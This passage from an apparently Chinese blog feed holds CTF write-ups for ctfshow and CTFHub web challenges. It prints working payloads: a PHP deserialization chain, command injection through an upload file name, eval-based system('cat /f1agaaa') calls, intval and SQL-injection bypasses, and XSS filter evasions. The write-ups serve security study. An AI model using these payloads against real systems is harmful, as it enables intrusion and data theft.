plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET=$flag</span><br></pre></td></tr></table></figure><p>从而实现目标，得到flag</p><p>ctfshow{2fe8eb61-9f07-4713-a7f2-311a3e4786d3}</p></blockquote><h4 id="茶歇区">茶歇区</h4><blockquote><p>考点：多次整数溢出</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160125845.png" alt="image-20241109160125845"></p><blockquote><p>先查看源码，找不到相关函数和score等计分的变量，所以不能通过控制台改代码了。</p><p>看到全是整数，想到整数溢出。先输入99999999999999999999</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160320364.png" alt="image-20241109160320364"></p><blockquote><p>9223372036854775807</p><p>999999999999999999</p><p>输入999999999999999999，不断重复，直到出现flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160421972.png" alt="image-20241109160421972"></p><blockquote><p>ctfshow{b31d09fc-4022-49ca-ad7d-ea533f98cdc2}</p></blockquote><h4 id="小舔田？">小舔田？</h4><blockquote><p>考点：序列化构造pop链</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Moon&#123;</span><br><span class="line">    public $name=&quot;月亮&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;牛夫人&quot;;</span><br><span class="line"></span><br><span class="line">    public function call()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\n&quot;;</span><br><span class="line">            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=new Ion_Fan_Princess();</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进行代码审计，发现是个序列化题，有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()和__wakeup()</span><br></pre></td></tr></table></figure><p>构造一条pop链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call() &lt;- Ion_Fan_Princess:__toString() &lt;- Moon:__wakeup()</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Moon&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;小甜甜&quot;;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Moon();</span><br><span class="line">$a-&gt;name = new Ion_Fan_Princess();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">//O%3A4%3A%22Moon%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A16%3A%22Ion_Fan_Princess%22%3A1%3A%7Bs%3A8%3A%22nickname%22%3Bs%3A9%3A%22%E5%B0%8F%E7%94%9C%E7%94%9C%22%3B%7D%7D</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ab725e26-0530-4535-8cb5-517419dccb8b}</p></blockquote><h4 id="LSB探姬">LSB探姬</h4><blockquote><p>考点：文件名中的命令执行</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109165919952.png" alt="image-20241109165919952"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ：2022/10/20 15:16</span><br><span class="line"># Author     ：g4_simon</span><br><span class="line"># version    ：python 3.9.7</span><br><span class="line"># Description：TSTEG-WEB</span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><blockquote><p>分析可知，执行cmd命令，所以进行命令执行漏洞利用，在filename后执行ls命令</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170048538.png" alt="image-20241109170048538"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170107042.png" alt="image-20241109170107042"></p><blockquote><p><a href="http://xn--flag-pm9f971itox.py">看到有flag.py</a>，执行命令cat <a href="http://flag.py">flag.py</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170155275.png" alt="image-20241109170155275"></p><blockquote><p>ctfshow{343152ec-5bd1-467a-9f6c-33d7d8d3cfc8}</p></blockquote><h4 id="Is-Not-Obfuscate">Is_Not_Obfuscate</h4><blockquote><p>考点：</p></blockquote><blockquote><p>打开后查看源码，发现端倪</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109171950520.png" alt="image-20241109171950520"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172008208.png" alt="image-20241109172008208"></p><blockquote><p>先查看/robots.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172038816.png" alt="image-20241109172038816"></p><blockquote><p>查看/lib.php?flag=1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172117578.png" alt="image-20241109172117578"></p><blockquote><p>将这段复制到框中，再根据提示修改前端</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172202256.png" alt="image-20241109172202256"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172300276.png" alt="image-20241109172300276"></p><blockquote><p>然后得到一串代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">include &#x27;lib.php&#x27;;</span><br><span class="line">if(!is_dir(&#x27;./plugins/&#x27;))&#123;</span><br><span class="line">    @mkdir(&#x27;./plugins/&#x27;, 0777);</span><br><span class="line">&#125;</span><br><span class="line">//Test it and delete it ！！！</span><br><span class="line">//测试执行加密后的插件代码</span><br><span class="line">if($_GET[&#x27;action&#x27;] === &#x27;test&#x27;) &#123;</span><br><span class="line">    echo &#x27;Anything is good?Please test it.&#x27;;</span><br><span class="line">    @eval(decode($_GET[&#x27;input&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;./plugins/&#x27;);</span><br><span class="line">if(!empty($_GET[&#x27;action&#x27;]))&#123;</span><br><span class="line">    switch ($_GET[&#x27;action&#x27;])&#123;</span><br><span class="line">        case &#x27;pull&#x27;:</span><br><span class="line">            $output = @eval(decode(file_get_contents(&#x27;./plugins/&#x27;.$_GET[&#x27;input&#x27;])));</span><br><span class="line">            echo &quot;pull success&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;push&#x27;:</span><br><span class="line">            $input = file_put_contents(&#x27;./plugins/&#x27;.md5($_GET[&#x27;output&#x27;].&#x27;youyou&#x27;), encode($_GET[&#x27;output&#x27;]));</span><br><span class="line">            echo &quot;push success&quot;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>看到了个eval函数，所以可以先利用push，再用pull执行命令。</p><p>首先，构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=&lt;?php eval(system(&quot;ls /&quot;));?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这个payload会经过file_put_contents()函数存储在目录下。然后用file_get_contents()函数在目录下读取。所以</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input=md5($_GET[&#x27;output&#x27;].&#x27;youyou&#x27;)。</span><br><span class="line">payload:</span><br><span class="line">?action=pull&amp;input=b4b23ad51ccba6f288833a4e25cb361b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235359796.png" alt="image-20241109235359796"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235416731.png" alt="image-20241109235416731"></p><blockquote><p>看到有个f1agaaa的文件，用同样的方式进行读取.</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=&lt;?php eval(system(&quot;cat /f1agaaa&quot;));?&gt;</span><br><span class="line">?action=pull&amp;input=ba53a5488a5dfda0aff1bb1ee5fcfaa2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235645962.png" alt="image-20241109235645962"></p><blockquote><p>ctfshow{876b2dd2-9785-4eb0-9a6d-7bf0a081bc5c}</p></blockquote>]]></content>
    
    
    <summary type="html">ctfshow刷题-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow萌新web</title>
    <link href="https://m3x1.cn/posts/72ad6da1.html"/>
    <id>https://m3x1.cn/posts/72ad6da1.html</id>
    <published>2024-12-01T14:09:31.080Z</published>
    <updated>2024-12-01T16:06:22.801Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源：ctfshow</p></blockquote><p>[TOC]</p><h2 id="web1">web1</h2><blockquote><p>考点：inval()函数漏洞，sql注入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>由于没有限制输入，所以只需要利用inval()的漏洞和sql注入漏洞拿到flag。</p><ol><li><p>?id=’1000‘       #字符串绕过</p></li><li><p>?id=0x3e8      #转换成16进制绕过</p></li><li><p>?id=-1 or id=1000</p></li><li><p>?id=100*10</p></li><li><p>?id=~~1000   #两次取反</p></li><li><p>?id=900%2B100      #%2B是+的url编码</p></li><li><p>?id=round(999.9)</p></li><li><p>?id=999 or 1=1 --+</p></li><li><p>?id=0b1111101000     #二进制</p></li><li><p>?id=125&lt;&lt;3</p></li><li><p>?id=1 union select * from article; --+</p></li><li><p>?id=/<em>!1000</em>/ 内联注释</p></li></ol></blockquote><blockquote><p>ctfshow{5853bd20-b1d4-420d-aa13-0c343c7e9461}</p></blockquote><h2 id="web2">web2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><blockquote><p>多了一个过滤，不能用or, +号，上面筛选一下就行</p><p>?id=‘1000’</p></blockquote><blockquote><p>ctfshow{622abd97-affc-4f13-9cb8-7181b9cc0ffa}</p></blockquote><h2 id="web3">web3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>依然是多了个过滤。?id=‘1000’</p><p>ctfshow{560b6c4f-7a73-4d0d-96ae-cb941878bdc9}</p></blockquote><h2 id="web4">web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>?id=‘1000’</p><p>ctfshow{3390706c-7566-466c-a86e-37a6d19f95cc}</p></blockquote><h2 id="web5">web5</h2>]]></content>
    
    
    <summary type="html">ctfshow萌新web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-XSS</title>
    <link href="https://m3x1.cn/posts/57dd66d8.html"/>
    <id>https://m3x1.cn/posts/57dd66d8.html</id>
    <published>2024-12-01T14:09:31.075Z</published>
    <updated>2024-12-01T16:06:22.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树-XSS系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-文件上传</title>
    <link href="https://m3x1.cn/posts/2f3e3730.html"/>
    <id>https://m3x1.cn/posts/2f3e3730.html</id>
    <published>2024-12-01T13:57:29.734Z</published>
    <updated>2024-12-01T16:06:22.801Z</updated>
    
